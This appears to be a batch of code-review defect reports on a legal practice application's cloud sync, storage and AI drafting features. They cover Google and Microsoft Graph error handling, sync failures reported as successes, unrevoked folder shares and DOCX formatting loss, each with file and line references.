defect_batches.claim: provider_http.py:95-100 turns every 401/403 into ProviderAuthError without checking the reason, but Google returns 403 rateLimitExceeded/userRateLimitExceeded; connected_mail maps this to REAUTHORIZATION_REQUIRED (connected_mail.py:267-280). Throttled users are told to reconnect and nothing is retried.

defect_batches.title: BK28/ECO ledger in TASKS.md is stale: shipped items unchecked and plan current-state gaps outdated
defect_batches.claim: TASKS.md:395-518 heads the epic '(PLANNED)' with every ECO item unchecked, although ECO-17 (Personal Google mode, integrations.py:266-286; CHANGELOG.md:279-289), ECO-24..28 (docs/sms-provider-operations.md:11-40; propose_client_sms) and parts of ECO-01/04 shipped. The plan still says 'personal Gmail directory sync fails' (plan:64) and that trial_ends_at is unread (plan:66, 262-265), fixed in 2026.09.11.8. Planning against it duplicates shipped work.

defect_batches.title: Per-user Microsoft tokens break OneDrive matter-folder search, sync and fetch because folders live in the admin's drive
defect_batches.claim: When a user has a personal Microsoft token it is preferred, and folder search, sync and content fetch call /me/drive/items/{adminFolderId}/... (cloud_search.py:1399-1435, esp. 1412; 1182-1184; cloud_sync.py:596-620). For an item in another user's drive Graph returns itemNotFound; _sync_graph_files logs and breaks (cloud_sync.py:1058-1064), and the matter 'Sync folder' route (matters.py:3407-3413) reports 'synced' with 0 files. Users who followed 'Connect Calendar' get empty matter cloud files and AI answers without matter documents, while unconnected users get results via the admin token. Fix requires drive-qualified paths (/drives/{driveId}/items/...).

defect_batches.title: After any storage migration, every scheduled sync force-rewalks the whole cloud tree and rewrites the index
defect_batches.claim: sync_all and sync_matter_folders call storage_migration_reindex.run(force=True) on every run (cloud_sync.py:80-111). That BFS makes one Graph/Drive call per folder plus marker downloads with no 429 handling (storage_discovery.py:233-298), then deletes and re-upserts all file rows (storage_migration_reindex.py:130-143). Any failure raises RuntimeError before mail sync runs (cloud_sync.py:85-88). Firms with thousands of matter folders make thousands of API calls every interval, get throttled, and all cloud sync (including mail metadata) fails continuously.

defect_batches.title: Cloud sync provider failures are recorded as successful syncs with 0 items
defect_batches.claim: On non-200 responses the provider loops break or return 0 instead of raising: Drive (cloud_sync.py:361-372), Gmail (493-501), Outlook (763-771), Graph files (1058-1064), SharePoint (641-661) and a missing token (330-332). The scheduler then records status='completed' (scheduler.py:1779-1790), contradicting the sync_all docstring (cloud_sync.py:75-77). Revoked consent or missing scopes show as a green 'completed, 0 ok' tile while the index goes stale.

defect_batches.title: Cloud sync holds a tenants row lock across hundreds of provider HTTP calls
defect_batches.claim: Every _upsert runs SELECT tenants FOR UPDATE plus a migration lookup (cloud_sync.py:884-889), and commit happens only after the whole provider loop (e.g. Gmail at 509-562 makes ~200 sequential HTTP calls, ~3 DB statements per item). Other writes to the tenant row (settings, onboarding, cutover) block or time out during every sync.

defect_batches.title: Tenant OneDrive and SharePoint index sync lists only root-level items
defect_batches.claim: sync_onedrive uses /me/drive/root/children (cloud_sync.py:584-594) and sync_sharepoint uses /drives/{id}/root/children (663-680) with no recursion or delta, so matter files in subfolders are absent from firm-wide search unless a per-matter sync runs.

defect_batches.title: Per-user Graph search requests listItem without Sites.Read.All, likely 403ing all driveItem hits
defect_batches.claim: Global Graph search sends entityTypes ['driveItem','listItem'] (cloud_search.py:937-986) with the per-user token, but MICROSOFT_USER_SCOPES has no Sites.Read.All (integrations.py:256-259). listItem requires it, so the request likely 403s and search_group returns None, giving users with a personal connection no OneDrive/SharePoint hits. PLAUSIBLE, needs live check.

defect_batches.title: Native Google Docs/Sheets are excluded from matter sync, firm-knowledge ingestion and search
defect_batches.claim: LEGAL_MIME_TYPES (cloud_sync.py:48-55) has no application/vnd.google-apps.* types; the matter-folder Drive query (cloud_sync.py:334-340) and document_sync (document_sync.py:22-28, 281-305) filter to PDF/DOCX/DOC/RTF/TXT, and the download uses alt=media (document_sync.py:370), which cannot fetch Docs; there is no files.export. Google Workspace firms drafting in Google Docs never see those documents in matters, search or AI context.

defect_batches.title: Google Drive firm-knowledge import query ANDs MIME and extension, skips Shared Drives and does not page
defect_batches.claim: document_sync.py:281-305 joins the mime and extension clauses with ' and ' (cloud_sync.py:339 uses OR), has no supportsAllDrives/includeItemsFromAllDrives, and uses pageSize=min(max_files,100) with no nextPageToken. .odt/.wpd files, extensionless files and Shared Drive files are never imported and counts cap at 100.

defect_batches.title: SharePoint index sync ignores the bound site and indexes /sites/root
defect_batches.claim: sync_all calls sync_sharepoint(db, tenant_id) without the sharepoint_binding site_id (cloud_sync.py:145-152, 622-700), so the admin-bound matter library is not indexed and intranet root-site files appear in firm search instead.

defect_batches.title: Per-matter 'Sync folder' reports 'synced' when providers failed
defect_batches.claim: sync_matter_folders only logs provider exceptions (cloud_sync.py:222-266) and the router returns status 'synced' with counts (matters.py:3407-3425), so users think the matter's cloud files are current when listing failed.

defect_batches.title: Microsoft Auto mode stores firm matter files in the connecting admin's personal OneDrive
defect_batches.claim: In Auto mode an active Microsoft connection binds storage to 'onedrive' (matter_file_store.py:150-153, 199-204; integrations.py:1996-2002). Every admin connect creates the LawHand root in the admin's /me/drive via _ensure_cloud_root (integrations.py:2398-2438; cloud_init.py:148-166, 1506-1508), and all reads/writes use the tenant delegated token against /me/drive/items/{parent} (matter_file_store.py:42-56, 832, 866-871). No sharing to other firm users exists on the OneDrive path, so 'Open cloud copy'/co-authoring is access-denied for other staff; storage_root_ownership rates it at_risk but only surfaces that in onboarding, contradicting the org-owned-root design (docs/storage-root-ownership-and-handoff.md:12-14, 28). When the admin leaves, is disabled or hits Conditional Access, all matter storage fails, and OneDrive retention after account deletion can destroy firm records.

defect_batches.title: Removing a matter assignee never revokes the cloud folder share granted to them
defect_batches.claim: Assignees are invited with write roles via /me/drive/items/{id}/invite (cloud_init.py:617-697, called from matters.py:185-218, 3095, 3188, 3263, 3402), but remove_assignment (matters.py:1772-1825) deletes the row and cleans calendars without calling DELETE .../permissions/{id}; the codebase has no unshare function. A lawyer screened off a matter keeps write access to its OneDrive/SharePoint/Drive folder indefinitely.

defect_batches.title: Editing a matter document in Word/Drive (as the UI invites) permanently breaks LawHand access with a 409
defect_batches.claim: Download reads cloud bytes with expected_size=doc.file_size (matter_documents.py:750-806) and read_matter_file_bytes enforces the stored size (matter_file_store.py:233-242, 1543-1551), so any edit via the 'Open in OneDrive/Google Drive' link (MatterDocumentsTab.jsx:1139-1147, 1278-1287) raises an integrity error, marks storage_state='conflict' and 409s every later download. E-sign creation reads with the same check (esignature.py:449-456). Folder sync never updates MatterDocument size/hash and only task-bound AI drafts have an adopt endpoint (tasks.py:1906), while the upload toast says 'Edits happen in the firm's cloud copy' (MatterDocumentsTab.jsx:440-444). Edited documents can no longer be downloaded, signed or fed to AI.

defect_batches.title: Template/agent DOCX drafts default to plain-text edit mode; a save flattens formatting and truncates at 50k chars
defect_batches.claim: propose_document_from_template and propose_matter_document_file build MatterDocumentDraftAction without document_edit_mode (chat_tools/handlers.py:1835-1850), so it defaults to 'lawhand_text' (schemas/chat_action.py:439); only the cloud-sync path sets 'office_snapshot' (tasks.py:2109). A text save (tasks.py:1806-1835) creates a revision from the extracted preview (capped at 50k chars) and re-renders via render_revision_docx with python-docx default styles (cloud_artifact_materialization.py:260-270, 435-440). This contradicts docs/workspace_mcp_adapter.md:489-491 (snapshots stay read-only so a save cannot flatten formatting). A typo fix strips letterhead, tables, headers/footers and drops content past ~50k chars, and approval binds to the damaged DOCX. Behind WORKSPACE_MCP_ENABLED/workflow runs.

defect_batches.title: LawHand text save on an AI draft silently orphans Word Online edits in the superseded file
defect_batches.claim: When superseding, cloud_artifact_materialization.materialize() only marks the previous document 'superseded' (cloud_artifact_materialization.py:661-676) and never reads the previous cloud object's current hash/eTag, while DocumentDraftWorkspace shows 'Open cloud working copy' beside the editable textarea and 'Save as new cloud revision' (DocumentDraftWorkspace.jsx:172-175) and TaskBoard assumes 'verified' storage (TaskBoard.jsx:1064). Word edits stay in the superseded -r1.docx and are missing from the approved revision without warning.

defect_batches.title: AI draft materialization requires an explicit primary_cloud_provider while uploads auto-bind
defect_batches.claim: cloud_artifact_materialization._configured_provider (276-295) raises CloudNotConfiguredError when the setting is blank, whereas MatterFileStore._resolve_provider_policy falls back to the active Microsoft or Google connection (matter_file_store.py:159-204). Auto-mode firms can save template documents to OneDrive but chat/MCP drafting fails with 'Choose and connect a primary tenant cloud provider'.
